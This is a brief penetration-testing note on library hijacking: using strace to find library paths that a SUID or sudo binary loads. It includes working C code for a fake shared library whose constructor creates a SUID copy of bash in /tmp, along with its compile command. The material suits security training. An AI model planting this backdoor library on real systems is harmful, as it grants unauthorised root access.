## Library Hijacking

If we come across a non-standard binary that can be executed with high privileges via sudo or is set as SUID, it’s important to check where it’s trying to load libraries from and ensure we don’t have access to manipulate any of those directories.

## Check

A simple technique to know which libraries a binary is attempting to load is using the `strace` command, which traces system calls made by the running binary. To reduce output, we can filter for strings where it tries to load a library.

```bash
strace [binary] 2>&1 | grep -i -E "open|access|no such file"
```

If we find a manipulable path, we can place a fake library with a bash backdoor, using the following code, for example:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash");
}
```

And for compilation:

```bash
gcc -shared -o backdoor.so -fPIC backdoor.c
```
